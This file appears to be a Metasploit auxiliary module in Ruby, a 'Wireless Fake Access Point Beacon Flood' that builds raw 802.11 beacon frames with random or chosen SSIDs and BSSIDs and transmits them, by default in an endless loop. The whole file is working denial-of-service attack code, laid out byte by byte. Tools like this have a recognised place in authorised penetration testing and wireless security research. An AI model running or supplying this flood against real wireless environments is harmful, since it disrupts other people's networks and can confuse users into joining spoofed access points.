##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Lorcon2
  include Msf::Auxiliary::Dos


  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Wireless Fake Access Point Beacon Flood',
      'Description'    => %q{
        This module can advertise thousands of fake access
      points, using random SSIDs and BSSID addresses. Inspired
      by Black Alchemy's fakeap tool.
      },

      'Author'         => [ 'hdm', 'kris katterjohn' ],
      'License'        => MSF_LICENSE
    ))

    register_options([
      OptInt.new('NUM', [false, "Number of beacons to send"]),
      OptString.new('BSSID', [false, "Use this static BSSID (e.g. AA:BB:CC:DD:EE:FF)"]),
      OptString.new('SSID', [false, "Use this static SSID"])
    ])
  end

  def run
    open_wifi
    print_status("Sending fake beacon frames...")
    if datastore['NUM'].nil? or datastore['NUM'] == 0
      wifi.write(create_frame()) while true
    else
      datastore['NUM'].times { wifi.write(create_frame()) }
    end
  end

  def create_frame

    ssid = datastore['SSID'] || Rex::Text.rand_text_alpha(rand(31)+1)
    if datastore['BSSID']
      bssid = eton(datastore['BSSID'])
    else
      bssid = Rex::Text.rand_text(6)
    end
    seq = [rand(255)].pack('n')

    "\x80" +                      # type/subtype
    "\x00" +                      # flags
    "\x00\x00" +                  # duration
    "\xff\xff\xff\xff\xff\xff" +  # dst
    bssid +                       # src
    bssid +                       # bssid
    seq   +                       # seq
    Rex::Text.rand_text(8) +      # timestamp value
    "\x64\x00" +                  # beacon interval
    "\x00\x05" +                  # capability flags

    # ssid tag
    "\x00" + ssid.length.chr + ssid +

    # supported rates
    "\x01" + "\x08" + "\x82\x84\x8b\x96\x0c\x18\x30\x48" +

    # current channel
    "\x03" + "\x01" + datastore['CHANNEL'].to_i.chr +

    # traffic indication map
    "\x05" + "\x04" + "\x00\x01\x02\x20" +

    # country information
    "\x07" + "\x06" + "\x55\x53\x20\x01\x0b\x12" +

    # erp information
    "\x2a" + "\x01" + "\x00" +

    # extended supported rates
    "\x32" + "\x04" + "\x12\x24\x60\x6c"

  end

end
